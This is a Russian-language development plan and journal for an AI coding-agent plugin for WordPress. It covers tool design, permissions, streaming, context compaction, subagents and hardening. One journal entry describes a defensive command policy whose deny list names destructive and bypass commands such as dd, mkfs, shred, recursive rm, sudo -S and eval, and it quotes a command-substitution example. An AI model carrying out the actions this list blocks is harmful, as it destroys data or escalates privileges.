- [x] **4.10** Универсальное усечение вывода в `ToolRunner`: `kMaxOutputLines = 2000`, `kMaxOutputBytes = 50*1024`; spill в `<data_dir>/wp_coder/trunc/<session>/<tool>`; `metadata.truncated = true` + `metadata.outputPath` (порт `tool/truncate.ts`).
- [x] **4.11** Сузить детектор doom-loop до 3 последних вызовов (порт `processor.ts:356`) + permission-ask `doom_loop`.
- [x] **4.12** Тесты: glob-паттерны, apply_patch round-trip на всех 4 видах операций, каскад `edit` (включая успех через `BlockAnchor`), усечение/spill, CRLF/BOM.

**Итог И4:** 10 новых инструментов и 6 новых модулей ядра; тесты
261 → 382, все зелёные, `ctest` 10/10. Новые: `glob`, `apply_patch`,
`todowrite`/`todoread`, плюс переименования `exec_command` → `bash`
(таймаут 120 с, кольцевой буфер, spill) и `list_dir` → `list { depth }`.
`search_replace` переведён на каскад из девяти стадий, `read_file`
получил `offset`/`limit` вместо перегруженного `k`, отказ для двоичных
файлов и список для каталога. Предел вывода общий для всех инструментов
(2000 строк / 50 КБ) и объявляется словами; полный вывод уходит в файл.
Веха **M3 «полный набор инструментов»** достигнута.

Что оказалось важнее самих инструментов (три находки, все пойманы
тестами, все — про молчаливое искажение):

1. **Формат файла.** `getline` оставлял BOM в первой строке, а
   перезапись писала BOM второй раз — файл получал два BOM. `split_text`
   снимает и восстанавливает BOM/CRLF в одном месте (`core/text_edit.h`),
   и теперь ни один пишущий инструмент не может их потерять. Проверяется
   не «как получилось», а классификацией: новый пишущий инструмент обязан
   попасть в таблицу теста, иначе тест падает с его именем.
2. **Хвост вывода.** Прежний `cap()` брал начало, то есть у длинной
   команды выкидывал ровно то место, где находится ошибка. Теперь
   кольцо `bash` держит хвост, а общий предел по умолчанию уступает
   инструменту, который уже усек вывод сам и знает, что важнее.
3. **Код возврата команды.** `WEXITSTATUS(0)` — ноль вместо кода
   ожидания — делал таймаут неотличимым от успеха. Поймано тестом на
   таймаут, который без этого проходил бы вхолостую.

**Готово, когда:** набор инструментов покрывает `read/write/edit/bash/glob/grep/list/apply_patch/todowrite/webfetch`; ни один инструмент не может вернуть неограниченный вывод. ✅

---

#### И5. Модель событий и сообщений (~5 дн.)

- [ ] **5.1** `core/llm_event.h`: вариантный `LlmEvent` — `StepStart, TextStart, TextDelta, TextEnd, ReasoningStart/Delta/End, ToolInputStart/Delta/End, ToolCall, ToolResult, ToolError, StepFinish, Finish, ProviderError` (порт `packages/llm/src/schema/events.ts:209`).
- [ ] **5.2** `struct Usage` с **непересекающимися** счётчиками: `input, output, reasoning, cache_read, cache_write, total` (инвариант: `input == nonCached + cacheRead + cacheWrite`, `reasoning <= output`) — чтобы потребители никогда не вычитали сами.
- [ ] **5.3** `LlmResponse::reduce(state, event)` — чистая свёртка, юнит-тестируется без сети.
- [ ] **5.4** `core/message.h`: `Message { id, role, parent_id }`, `MessagePart` (варианты: `Text, Reasoning, Tool, StepStart, StepFinish, Patch, Retry, Compaction, Subtask`), `ToolState` — 4-состоянийный union `Pending/Running/Completed/Error` (порт `SessionV1`).
- [ ] **5.5** Префиксы ID: `msg_`, `prt_`, `ses_` — монотонные, лексикографически сортируемые.
- [ ] **5.6** `core/session_store.{h,cpp}`: персистентность в `<data_dir>/wp_coder/sessions/<session_id>.json` через `JsonValue` (**заменяет наивный сканер**, D10) + атомарная запись (write-temp + rename).
- [ ] **5.7** Перевести `AgentLoop::run` на событийную модель: одна строка `Assistant` на ход, части внутри, `parent_id` на инициирующее сообщение.
- [ ] **5.8** Перенести условие завершения: не счётчик шагов, а «последний ход `finish ∉ {tool-calls, unknown}`, нет незакрытых tool-частей, `parent_id == last_user.id» (порт `prompt.ts:1111-1130`).
- [ ] **5.9** `max_steps` → `isLastStep` + добавление хвостового напоминания «дай текстовый итог» вместо жёсткой остановки (порт `prompt.ts:1281`).
- [ ] **5.10** Тесты: свёртка событий, сборка истории в модельные сообщения, round-trip JSON, `parent_id`/`finish`-семантика завершения.

**Готово, когда:** цикл не знает про строки — он обрабатывает события; вся история — структурированные части, а не склейка строк.

---

#### И6. Стриминг и честная отмена (~4 дн.)

- [ ] **6.1** **Хост**: добавить в `LlamaHostApi` (append-only, конец структуры) `llm_chat_stream(host, system_prompt, messages_json, request_json, user_data, on_delta, on_tool_delta, on_done)`. Реализация на базе `LlamaInterface::create_chat_completion_streaming` (`include/core/llama_interface.h:231`) и `OpenRouterClient::complete_streaming_async`.
- [ ] **6.2** Вернуть в `ChatCompletionRequest` поля `tools` / `tool_choice` / `response_format` (сейчас отсутствуют, `include/core/llama_interface.h:47-92`) — **требует** поддержки в локальном llama-server; зафиксировать как feature-detect.
- [ ] **6.3** **Хост**: `llm_ast_symbols(host, path, language)` → JSON символов; реализация через `core::AstParser` (`src/core/ast_parser.cpp`) с уже собранными `libtree-sitter-grammar-php/python/javascript/cpp.a`.
- [ ] **6.4** **Плагин**: feature-probe по `offsetof(LlamaHostApi, llm_chat_stream)` (паттерн `src/plugin_main.cpp:127-130`) + прозрачный откат на блокирующий `llm_chat_messages` через адаптер `LlmClient`.
- [ ] **6.5** `class LlmClient` — единая точка вызова: `stream(sys, msgs, on_event, on_done)`; внутри — streaming или блокирующий путь, наружу — всегда события.
- [ ] **6.6** Замена `std::async`-обрыва на настоящий `AbortToken`: `abort()` распространяется в стриминг, в `bash` (kill по `ctx.abort`), в дочерние сессии субагентов. Убрать «брошенный future» из `plugin_main.cpp:179-204`.
- [ ] **6.7** Отмена инструмента, а не только ожидания LLM: `ToolContext.abort`; `bash` → `kill` с `forceKillAfter 3s`.
- [ ] **6.8` Раздельные терминальные состояния**: `Aborted` ≠ `Error` (порт `message.ts` error taxonomy); `EngineState` уже имеет `Aborted`, связать с событийной моделью.
- [ ] **6.9** Тесты: `LlmClient` на обоих путях (потоковый/блокирующий) даёт одинаковую последовательность событий; откат при отсутствии символа в ABI.

**Готово, когда:** пользователь видит токены в реальном времени, кнопка «Стоп» обрывает поток и работающий инструмент, всё это работает и на старом хосте.

---

#### И7. Управление контекстом (~4 дн.)

- [ ] **7.1** `core/compaction.{h,cpp}`: математика переполнения с резервом под саму сводку — `usable = limit - max(reserved, min(20000, max_output_tokens))` (порт `session/overflow.ts`).
- [ ] **7.2** Реальный учёт токенов от хоста; фолбэк-оценка `chars/4` только для предварительных решений.
- [ ] **7.3** `Compaction::select()`: обход ходов от новых к старым, `preserve_recent_tokens = clamp(usable*0.25, 2000, 15000)`, опциональный `tail_turns`.
- [ ] **7.4** Сериализация в плоский транскрипт: `[User]`, `[Assistant]`, `[Assistant reasoning]`, `[Assistant tool call] tool({json})`, `[Tool result]` (усечение 2000 символов), `[Tool error]`.
- [ ] **7.5** Суммаризация **отдельным агентом** `compaction` с `permission: "*" → deny` и пустым набором инструментов; результат `"continue" | "stop" | "compact"`; `"compact"` → `ContextOverflowError` и стоп.
- [ ] **7.6** Итеративность: предыдущая сводка подаётся в новый промпт.
- [ ] **7.7** Автопродолжение синтетическим сообщением `"Continue if you have next steps, or stop and ask for clarification if you are unsure how to proceed."` с тегом `compaction_continue`.
- [ ] **7.8** `filter_compacted()` — переупорядочивание истории в `[compaction-user, summary, …хвост…, continue-user]` (порядок массива не хронологический).
- [ ] **7.9** Опциональное прореживание вывода инструментов (`PRUNE_PROTECTED_TOOLS = ["skill"]`, порог 40 КБ / минимум 20 КБ), рендер «[Old tool result content cleared]».
- [ ] **7.10** Заменить `SessionStore::trim` (обрезка строк) на компакшн; старый trim оставить только как аварийный предохранитель.
- [ ] **7.11** Тесты: выбор head/tail на границах, авто-компакшн по порогу, итеративная сводка, корректность `to_model_messages` после переупорядочивания.

**Готово, когда:** длинная сессия не переполняет контекст; сводка не теряет хвост; цикл продолжает работу после компакшна.

---

### Волна C — «агентная сеть» (И8–И10, ~9 дн.)

---

#### И8. Субагенты и конфиг-агенты (~6 дн.)

- [ ] **8.1** `core/agent_registry.{h,cpp}` — **внутри плагина** (хостовый `AgentRegistry` — плоский RPC для slash-команд, без цикла; `src/agents/agent_registry.cpp:98-127`).
- [ ] **8.2** Загрузка агентов из `.wpcode/agent/*.md` с YAML-frontmatter: `description, mode (primary|subagent|all), model, temperature, top_p, prompt, tools, permission, steps, color, hidden, options` (порт `config/agent.ts:11`). Тело файла = `prompt`.
- [ ] **8.3** Нормализация: `tools` (legacy bool-map) → правила `permission`; `write`/`edit`/`patch` → один ключ `edit`; неизвестные ключи → `options` (порт `agent/agent.ts:40-69`).
- [ ] **8.4** `Agent::Info` — рантайм-структура; `permission` — **предвыровненный** Ruleset, который не мутируется во время работы (только `approved` дописывается).
- [ ] **8.5** Встроенные агенты (порт `agent/agent.ts:119-265`): `wp_build`, `wp_plan`, `wp_general`, `wp_explore`, `compaction`, `title`, `summary` — с их permission-дельтами.
- [ ] **8.6** `wp_explore` — то, что реально нужно: `"*" → deny`, затем `grep, glob, list, bash, webfetch, read, ast_symbols → allow`; промпт `explore.txt` с требованием указать thoroughness (`quick`/`medium`/`very thorough`).
- [ ] **8.7** Инструмент `task { description, prompt, subagent_type, task_id?, background? }` (порт `tool/task.ts`).
- [ ] **8.8** Лимит глубины вложенности (`subagent_depth`, по умолчанию 1) → ошибка `Subagent depth limit reached (N).`.
- [ ] **8.9** Дочерняя сессия: `parent_id`, `title = "<description> (@<agent> subagent)"`, `task_id` возобновляет существующую.
- [ ] **8.10** Наследование разрешений: ребёнок наследует **только deny** и `external_directory` родителя; авто-`deny` на `task` и `todowrite`, если в правилах ребёнка их нет (порт `agent/subagent-permissions.ts`).
- [ ] **8.11** Извлечение результата: ошибка хелпера → последняя tool-часть в статусе `error` → последняя text-часть. Обёртка `<task id="ses_…" state="completed"><task_result>…</task_result></task>` (порт `task.ts:69`).
- [ ] **8.12` Каскад отмены: `ctx.abort` родителя → `cancel(child)`.
- [ ] **8.13** Динамическое описание `task` со списком доступных субагентов; агенты с `task: deny` **не показываются** модели.
- [ ] **8.14** `background: true` — возврат сразу, синтетическое сообщение в родителя по завершении, с явным «не опрашивай прогресс».
- [ ] **8.15` **Реализовать настоящих WP-субагентов** вместо мёртвого кода И0.6: `wp_theme`, `wp_plugin`, `wp_hook`, `wp_deploy` — реальные tools + промпты, а не `{"status":"stub"}`. `wp_rag`/`wp_terminal`/`wp_file` **не создавать**: дублируют `core/`.
- [ ] **8.16** Тесты: загрузка frontmatter, нормализация `tools`→`permission`, лимит глубины, наследование, каскад отмены, извлечение результата.

**Готово, когда:** `wp_explore` реально сжимает контекст для больших задач, `wp_plan` не может редактировать, отмена родителя гасит детей.

---

#### И9. Инструкции и навыки (~2 дн.)

- [ ] **9.1** Загрузка инструкций: `~/.config/wp_coder/AGENTS.md` → `AGENTS.md` → `CLAUDE.md` при подъёме от cwd к worktree; плюс `config.instructions` (glob, `~`, `http(s)://` с таймаутом 5 с). Каждый источник — отдельный системный блок `Instructions from: {path}`.
- [ ] **9.2` `Instruction::resolve(file)` — proximity-attach: при чтении файла подняться от его каталога и подтянуть **ближайший** `AGENTS.md`/`CLAUDE.md`, которого ещё нет в системном промпте; дедупликация двумя механизмами — `metadata.loaded` из `read` (И4.7) и per-message множество `claims` (порт `session/instruction.ts:179`).
- [ ] **9.3** Порядок сборки системного промпта (порт `session/llm/request.ts:58`): **базовый промпт → env-блок → AGENTS.md → инструкции модулей → каталог навыков → переопределение текущего запроса**.
- [ ] **9.4** `env`-блок: модель, provider, `Working directory`, `Workspace root folder`, `Is directory a git repo`, `Platform`, дата (порт `session/system.ts:74`).
- [ ] **9.5** Навыки: обернуть тело в `<skill_content name="…">` + выборка `<skill_files>` (порт `src/skill/`).
- [ ] **9.6` Двухуровневый каталог навыков: **подробный** в системном промпте, **краткий** в описании инструмента `skill` (порт `session/system.ts:107-116`).
- [ ] **9.7` Активировать 4 JSON-профиля harness: `fast_local`, `accurate_cloud`, `secure_audit`, `debug_verbose` — сейчас `profile_config_` загружается и не читается. Привязать к конфиг-агентам И8.
- [ ] **9.8** Тесты: приоритет имён инструкций, proximity-attach без дублей, порядок блоков промпта, профили влияют на `temperature`/`steps`/набор инструментов.

**Готово, когда:** правила проекта из `AGENTS.md` применяются автоматически и локально, а не требуют повторения в каждом запросе.

---

#### И10. Снапшоты и revert (~2 дн.)

- [ ] **10.1** `core/snapshot.{h,cpp}`: на `step-start` и на каждый ход — `git stash create` / `git write-tree` для получения tree-hash; фолбэк на копирование каталога, если не git-репозиторий.
- [ ] **10.2` `PatchPart { hash, files[] }` — список изменившихся файлов между снапшотами (порт `SnapshotPart`/`PatchPart`).
- [ ] **10.3** Инструмент `revert { hash }` — восстановление состояния по снапшоту. Заменяет одноглубины `undo_edit` (`.orig` перезаписывается на каждый файл).
- [ ] **10.4** Многоуровневый undo: стек снапшотов на сессию + `undo`/`redo` через них.
- [ ] **10.5** Diff для каждого снапшота доступен UI (совместно с И11.2).
- [ ] **10.6** Тесты: снапшот/восстановление на не-git-каталоге, откат нескольких файлов, целостность при прерывании.

**Готово, когда:** любое изменение файлов агентом откатывается одной командой, а не одним слотом `.orig`.

---

### Волна D — «видимость и полировка» (И11–И13, ~10 дн.)

---

#### И11. UI: diff, таймлайн, тосты (~6 дн.)

- [ ] **11.1** Виджет diff в ImGui: тематизированные `added`/`removed`/`context`, номера строк с разной окраской, переключатель `word-wrap`, `trim_diff()` (срезает общий ведущий отступ — порт из opencode).
- [ ] **11.2** Подсветка diff до/после; diff приходит из `ToolOutput::metadata.filediff = {file, patch, additions, deletions}`.
- [ ] **11.3** Таймлайн/дерево вызовов инструментов по ходам: сворачиваемое, с длительностью и статусом каждого хода.
- [ ] **11.4` Панель отображения по типу инструмента (`toolDisplay`): `bash` (ввод + вывод + exit), `read` (превью), `edit`/`write`/`apply_patch` (**diff**), `grep`/`glob` (список), `task` (вложенное дерево субагента), `todowrite` (чек-лист).
- [ ] **11.5` Глобальный переключатель `showDetails`, скрывающий **успешные** вызовы.
- [ ] **11.6` Панель стриминга: дельты текста, «размышление» (reasoning), индикатор активного инструмента.
- [ ] **11.7` Панель `todowrite` с интерактивными чекбоксами и счётчиком незавершённых.
- [ ] **11.8` Диалог разрешения: показ `permission`, `patterns`, предложенного `always`-паттерна, кнопки `Разрешить разово` / `Всегда` / `Отклонить`, каскадное отклонение остальных ожидающих.
- [ ] **11.9` Панель токенов и стоимости: input/output/reasoning/cache, суммарная стоимость, `tok/s`, доля контекста.
- [ ] **11.10` Отмена **работающего инструмента** (не только ожидания LLM) + индикатор отменяемости.
- [ ] **11.11` Перенос горячих клавиш: `Ctrl+O` диалог правок, `Ctrl+Enter` одобрить план, `Esc` стоп, `Ctrl+B` свёрнуть детали.
- [ ] **11.12` **Устранить захват `st.mtx` под ImGui** (текущий риск зависания, D1-связанный): снимок состояния под локом → отпустить лок → рисовать (D-6).
- [ ] **11.13` Тесты: снапшоты рендера (golden) для diff и таймлайна; проверка отсутствия deadlock при активном агенте.

**Готово, когда:** пользователь видит каждый шаг агента, диффы до/после, может одобрить/отклонить и отменить в любой момент.

---

#### И12. Тюнинг под модели и восстановление после ошибок (~3 дн.)

- [ ] **12.1` `SystemPrompt::provider(model_id)` — выбор базового промпта по семейству модели через substring-match (порт `session/system.ts:28`): `qwen`/`llama`/`gemma` → свой текст с акцентом на строгий протокол; `gpt-*` → свой; `deepseek` → свой. Для локальных моделей — акцент на «ровно один блок за сообщение» и JSON-only.
- [ ] **12.2` **Нативный tool calling** для провайдеров, которые его поддерживают: заполнить `ChatCompletionRequest::tools` (6.2), разбор `tool_calls`; для остальных — текстовый протокол. Переключение по feature-detect.
- [ ] **12.3` `experimental_repairToolCall`: имя инструмента в нижнем регистре, если так есть в реестре; иначе маршрутизация в скрытый инструмент `invalid { tool, error }`, чтобы модель получила настоящий результат вызова, а не ошибку протокола (порт `llm.ts:296`).
- [ ] **12.4` Подмена `edit`+`write` → `apply_patch` для `gpt-*` (кроме `oss`/`gpt-4`) (порт `tool/registry.ts:297`).
- [ ] **12.5` Таксономия ошибок: `ProviderAuthError`, `MessageAbortedError`, `MessageOutputLengthError`, `ContextOverflowError`, `ContentFilterError`, `APIError{retryable}` (порт `packages/core/src/v1/session.ts:36`).
- [ ] **12.6` Политика ретраев: initial 2000 мс, фактор 2, jitter 0.25, максимум 5; приоритет заголовков `retry-after-ms` / `retry-after`; классификация «повторяемо» по 7 семействам регулярных выражений; событие `retry` в UI с обратным отсчётом (порт `session/retry.ts`). Заменить текущие «3 попытки, 1 с/3 с» в `plugin_main.cpp:156-244`.
- [ ] **12.7` GBNF-грамматика для локальных моделей: `ChatCompletionRequest::grammar` уже есть (`include/core/llama_interface.h:82`) — сгенерировать грамматику вызова инструмента из JSON-схемы, чтобы парсер перестал быть хрупким.
- [ ] **12.8` Тесты: выбор промпта по модели, repair-маршрутизация, классификация ошибок, backoff-последовательность.

**Готово, когда:** одна и та же агентная логика одинаково хорошо работает на локальной 7B и на облачной модели.

---

#### И13. Харденинг, исправление долгов, финализация (~3 дн.)

- [ ] **13.1` **Path-guard на `weakly_canonical`** с проверкой через `fs::relative` — закрыть D6 (симлинк-обход). Эталон уже есть в мёртвом `wp_file_agent.cpp:430-437`.
- [ ] **13.2` `pending_apply` (plan mode) — полный путь проверки: `is_path_safe` + `is_path_not_dangerous` + разрешение + `.orig`-бэкап (D7).
- [ ] **13.3` `wp_create_site` — SQL через параметризацию, без снятия экранирования (D8).
- [ ] **13.4` `django_manage` — экранирование `args` (D9).
- [ ] **13.5` `repo_map` перевести на `llm_ast_symbols` (tree-sitter) с фолбэком на строковый скан; извлечение `add_action`/`add_filter`/`add_shortcode` сохранить.
- [ ] **13.6` Итоговая безопасность: `git_*`, `deploy`, `systemd_*`, `ssh_exec` — обязательное подтверждение через `PermissionEngine`.
- [ ] **13.7` Нагрузочные тесты: 200 вызовов инструментов, 10-сессийная история, компакшн под нагрузкой, отмена на каждом шаге.
- [ ] **13.8` Тесты на деградацию: хост без `llm_chat_stream`, без `llm_ast_symbols`, без `llm_chat_messages` (фолбэк `llm_complete_ex` с честной потерей истории и метрик).
- [ ] **13.9` Покрытие тестами ≥ 80 % для `core/` (сейчас 259 тестов; цель — не меньше).
- [ ] **13.10` Обновить `README.md`, `DEVELOPMENT_PLAN.md`, счётчики к фактическим. `CHANGELOG.md` и `plugin.json` ведутся начиная с И0.8 и закрываются в каждой итерации (сейчас 0.8.0).
- [ ] **13.11` Рефакторинг `core/project.cpp` (D13) и удаление мёртвого кода из `module_api.cpp` (`all_tools`/`combined_system_prompt` не вызываются).
- [ ] **13.12` Решение по `agents::SecurityManager`/`Sandbox` хоста: либо документировать, что плагин использует собственную (более строгую) политику, либо мигрировать. Зафиксировать в `README.md`.

**Готово, когда:** ни одна из перечисленных проблем не воспроизводится; документация соответствует коду; тесты зелёные.

---

## 4. Трекинг прогресса

Обновлять после каждой задачи: маркер `[ ]`→`[~]`→`[x]`, затем строку таблицы, затем журнал.

### Правило передачи сессии (обязательно на границе итерации)

Сессия агента заканчивается вместе с окном чата, а работа — нет. Поэтому на
границе итерации агент обязан оставить в репозитории то, с чем начнёт
следующую сессию, и коммит это фиксирует. Распределено так, чтобы
**изменяемое не дублировалось**:

| Что | Где живёт | Как часто меняется |
|---|---|---|
| Что сделано, что следующее, вехи, журнал | этот §4 | каждый шаг |
| Поведение для пользователя | `CHANGELOG.md` | каждая итерация |
| **Как здесь работать**: база сборки, ограничения, порядок, что читать и что не трогать | [`SESSION_START.md`](SESSION_START.md) | почти никогда |

Порядок на границе итерации: §4 (маркеры, сводная таблица, волна, веха,
журнал) → `CHANGELOG.md` → проверить `SESSION_START.md` → один коммит.

**Почему напоминалка отдельным файлом, а не абзацем в плане.** Текст в
чате умирает вместе с окном и не попадает в `git diff`, поэтому его нельзя
ни проверить, ни откатить. Отдельный файл виден в диффе рядом с той
правкой, ради которой он писался.

**Почему в напоминалке нет номера коммита, числа тестов и номера
итерации.** Все три меняются каждый день, а файл перечитывают спустя
недели. Напоминалка с устаревшим `HEAD` хуже её отсутствия: следующая
сессия поверит числу. Всё изменяемое берётся из этого плана и из
`git log --oneline -1`, а инвариант «в напоминалке нет изменяемых данных»
закреплён тестом `session_start_file_has_no_volatile_data`. Обновление
напоминалки на границе итерации — обычно no-op, и это признак того, что
данные не расползлись на два места (болезнь D12: версия в четырёх файлах).

### Сводная таблица

| Итерация | Название | Задач | Готово | % | Статус |
|---|---|---|---|---|---|
| И0 | Стабилизация и честность | 9 | 9 | 100 % | `[x]` ✅ 2026-09-25 |
| И1 | Типизированные инструменты | 10 | 10 | 100 % | `[x]` ✅ 2026-09-25 |
| И2 | Система разрешений | 10 | 10 | 100 % | `[x]` ✅ 2026-09-25 |
| И3 | Политика команд (allowlist) | 8 | 8 | 100 % | `[x]` ✅ 2026-09-25 |
| И4 | Паритет набора инструментов | 12 | 12 | 100 % | `[x]` ✅ 2026-09-26 |
| И5 | Модель событий и сообщений | 10 | 0 | 0 % | `[ ]` |
| И6 | Стриминг и отмена | 9 | 0 | 0 % | `[ ]` |
| И7 | Управление контекстом | 11 | 0 | 0 % | `[ ]` |
| И8 | Субагенты и конфиг-агенты | 16 | 0 | 0 % | `[ ]` |
| И9 | Инструкции и навыки | 8 | 0 | 0 % | `[ ]` |
| И10 | Снапшоты и revert | 6 | 0 | 0 % | `[ ]` |
| И11 | UI: diff, таймлайн, тосты | 13 | 0 | 0 % | `[ ]` |
| И12 | Тюнинг под модели | 8 | 0 | 0 % | `[ ]` |
| И13 | Харденинг и финализация | 12 | 0 | 0 % | `[ ]` |
| | **ИТОГО** | **142** | **49** | **35 %** | `[~]` |

### Прогресс по волнам

| Волна | Содержание | Итераций | % |
|---|---|---|---|
| **A** | «не слокано» (И0–И3) | 4 | **100 %** ✅ |
| **B** | «паритет инструментов» (И4–И7) | 4 | 25 % |
| **C** | «агентная сеть» (И8–И10) | 3 | 0 % |
| **D** | «видимость и полировка» (И11–И13) | 3 | 0 % |

### Вехи

| Веха | Итерации | Критерий | Статус |
|---|---|---|---|
| **M1 — не зависает** | И0 | Длинная сессия не подвешивает GUI; нет некомпилируемого кода | ✅ 2026-09-25 |
| **M2 — управляемый** | И1–И3 | Режимы и разрешения enforce'ятся централизованно; allowlist команд | ✅ 2026-09-25. И1 закрыл режимы (enforcement по флагам в `ToolRunner::run`, все 50 инструментов), И2 — разрешения (правила, once/always/reject с каскадом, скрытие запрещённых инструментов), И3 — allowlist команд (D5) |
| **M3 — полный набор инструментов** | И4 | Есть `glob`, `apply_patch`, `todowrite`, каскадный `edit`, `bash` со spill | ✅ 2026-09-26 |
| **M4 — событийная модель + стриминг** | И5–И6 | Токены в реальном времени, честная отмена, работает на старом хосте | `[ ]` |
| **M5 — длинные задачи** | И7 | Компакшн вместо обрезки; длинная сессия не переполняет контекст | `[ ]` |
| **M6 — субагенты** | И8 | `task` с лимитом глубины, наследованием, каскадом отмены; `wp_explore`/`wp_plan` | `[ ]` |
| **M7 — контекст проекта** | И9–И10 | `AGENTS.md` proximity-attach; откат по снапшоту | `[ ]` |
| **M8 — паритет опыта** | И11–И13 | Diff, таймлайн, тосты, тюнинг под модели, харденинг | `[ ]` |

### Журнал

| Дата | Итерация | Что сделано | Заметки |
|---|---|---|---|
| 2026-09-26 | И4 | **Завершена. Веха M3 достигнута.** Новые модули: `core/glob.{h,cpp}` (обход с `**`, `*`, `?`, `{a,b}`, фильтр расширений, сортировка по mtime, лимит 100, предохранитель обхода), `core/text_edit.{h,cpp}` (BOM/CRLF + каскад из 9 заменителей), `core/apply_patch.{h,cpp}` (разбор патча и хуки), `core/file_lock.{h,cpp}` (полосы мьютексов по пути). Новые инструменты: `glob`, `apply_patch`, `todowrite`, `todoread`; переименования `exec_command` → `bash` (таймаут 120 с, кольцевой буфер с хвостом, spill в файл, живой прогресс раз в секунду) и `list_dir` → `list { depth }`. `search_replace` переведён на каскад (порог нечёткости 0.65, единственность на каждой стадии, `replace_all` только явным флагом), добавлена защита от непропорционального спана; `read_file` получил `offset`/`limit`, отказ для двоичных файлов (>30 % непечатаемых), список для каталога и `metadata.loaded` с инструкциями рядом. Предел вывода общий: 2000 строк / 50 КБ, остаток в `<data_dir>/wp_coder/trunc/`, путь в ответе. Детектор doom-loop сужен до 3 последних вызовов и спрашивает пользователя вместо самовольной отмены. **Сторож в тест-фреймворке**: тест дольше 30 с печатает своё имя и завершает процесс кодом 3. Версия 0.8.0 → 0.9.0. Тесты 261 → 382, все зелёные; `ctest` 10/10 | Четыре дефекта, найденных по ходу, и все четыре — из тех, что тихо портят данные. (1) `getline` оставлял BOM в первой строке, и перезапись давала **два BOM** подряд; теперь формат файла живёт в одном месте (`text_edit`), и новый пишущий инструмент обязан попасть в таблицу теста, иначе тест падает с его именем. (2) `shell::cap` брал **начало** длинного вывода, то есть выкидывал место, где ошибка; кольцо `bash` держит хвост, и общий предел уступает инструменту, который усек вывод сам. (3) `WEXITSTATUS(0)` вместо кода ожидания: **таймаут был неотличим от успеха** — поймано тестом на таймаут, который иначе проходил бы вхолостую. (4) Формула 4.4 в плане невыполнима буквально (`old >= max(old+3, old*2)` не истинно никогда), а `WhitespaceNormalized` в указанном порядке полностью перекрывал `IndentationFlexible` и `TrimmedBoundary` — обе стадии были бы мёртвым кодом. Ещё: нечёткая стадияBlockAnchor работает по строкам и без защиты съедала бы строку целиком, когда просили её фрагмент. Отдельно поправлены две проверки, которые не могли упасть: `git_tools_work_in_real_repo` искал подстроку «cd», встречающуюся в hex-хеше коммита (~2 % прогонов), а сравнение манифестов указывало на несуществующий путь — из-за чего копия `plugins/wp_coder.json` отстала до 0.6.0 незамеченной (болезнь D12 в третий раз). Обе исправлены и **проверены мутацией** |
| 2026-09-25 | И3 | **Завершена. Волна A закрыта, веха M2 достигнута.** Закрыт D5. Добавлены `core/command_policy.{h,cpp}`: `CommandPolicy {allowed_binaries, arg_rules, trusted_hosts}`, `ParsedCommand`, разбор командной строки со снятием кавычек и рекурсивным обходом `|`, `&&`, `;`, `( )`, `$( )`, backticks (глубина ≤ 8). Валидаторы: `git` (`-c`, `--exec-path`, `!`, персистентные хуки через `git config`), `sudo` (`-E`, `-S`, sudoers, `visudo`, `tee`), `curl`/`wget` (allowlist хостов, запрет выгрузки и чтения конфига), `rm -r` с абсолютным/неразрешимым путём, `dd`/`mkfs*`/`fdisk*`/`shred`, универсальные обходы (`sh`, `env`, `xargs`, `nohup`, `eval`, `su`, `find -exec`), код из строки у интерпретаторов, опасные переменные окружения. Два режима: `check()` (allowlist программ и хостов) для `exec_command`, `check_assembled()` (только запреты) для 49 остальных инструментов. Подключение — в `shell::run_capture*`, единственной точке исполнения. `always_pattern` сужает «всегда» до `git status *`. Allowlist сетевых хостов (localhost + `wp_site_url`). Версия 0.7.0 → 0.8.0. Тесты 234 → 259, все зелёные; `ctest` 10/10 | Три находки, все пойманы тестами, и все три — про нормализацию имён. (1) Отбрасывание номера версии обрезало `mkfs.ext4` до `mkfs.ext` — запрет на `mkfs` переставал срабатывать; вылечено перебором **вариантов** имени (`php8.1`→`php`, `mkfs.ext4`→`mkfs`), а не одним нормализованным именем. (2) `2>&1` разбиралось как оператор `&` + программа `1`, то есть проверялась не та команда. (3) Первая версия запрещала любой путь под `/dev` — и сломала бы `2>/dev/null` в каждой второй команде (`systemctl`, health check). Отдельно: `wp_create_site` не создавал сайт вообще — обратные кавычки SQL внутри двойных кавычек для bash это подстановка команды (`echo "a \`id -u\` b"` → «a 0 b»), идентификатор базы заменялся пустым выводом, и SQL уходил битым. D8 (экранирование пароля) остаётся за И13.3, но теперь спецсимвол в пароле даёт отказ политики, а не молча испорченный SQL. Guard-тесты 3.7 проверены мутацией — с подставленным `std::system` и `popen` они падают |
| 2026-09-25 | И2 | **Завершена.** Добавлены `core/permission.{h,cpp}` (`PermissionAction`, `Rule`, `Ruleset`, `Wildcard::match`) и `core/permission_engine.{h,cpp}` (`PermissionEngine` — член `Engine`, правила живут в сессии). `evaluate` по упорядоченным правилам, last match wins, дефолт `Ask`. `ask()` — очередь запросов с адресами, кондивар и мост в `AgentState::WaitingPermission`; ответы `once`/`always`/`reject`, отказ каскадит на все ожидающие; `approve()` пересканирует очередь; `visible_tools()` убирает из каталога промпта инструменты с catch-all `deny`. Заполнен `permission_key` у всех 50 инструментов по 14 группам. `PermissionGate` (путь вне проекта) теперь смотрит правила — whitelist data_dir/tmp/skills заработал. Правила пользователя читаются из настройки `wp_coder.permission_rules`. Панель разрешений в UI со снимком очереди без `st.mtx` (D-6). Версия 0.6.0 → 0.7.0. Тесты 179 → 234, все зелёные; `ctest` 10/10 | Три находки по ходу, все пойманы тестами: (1) `git * → ask` стоял **ниже** `git status* → allow` и last-match-wins съедал исключение — `git status` начал бы спрашивать; порядок правил оказался не косметикой; (2) в разборе JSON-правил строка `"ask"` попадала в `Allow` — опечатка в настройке молча разрешала запрещённое; (3) после `cancel_all()` отмена держалась до конца сессии, и новая задача после «стоп» получала бы мгновенные отказы — теперь `Engine::submit` снимает отмену |
| 2026-09-25 | — | План создан; диагностика кода завершена | И0 не начата |
| 2026-09-25 | И1.10 | Устранена мина замедленного действия. Манифесты копируются под именем плагина (`wp_coder.json`, `hello_plugin.json`), общий `plugin.json` из `build/plugins/` удаляется; хост **отбрасывает** манифест с чужим `name` вместо предупреждения; `PluginLoader` закрепляет инвариант «манифест принадлежит своему плагину»; корень `CMakeLists.txt` падает при `BUILD_TESTS=OFF` + хвосте от прошлой сборки. `build/tests` очищен от 9 бинарников от 08-26…08-29, `BUILD_TESTS` включён, хостовые тесты пересобраны: **ctest 10/10**. Тесты плагина 174 → 179 | «Сегфолты» оказались не сегфолтами кода, а бинарниками месячной давности, собранными до появления `agent_mode_*` в ABI. Код плагина не трогал. **Правило: сначала возраст бинарника, потом обвинение** |
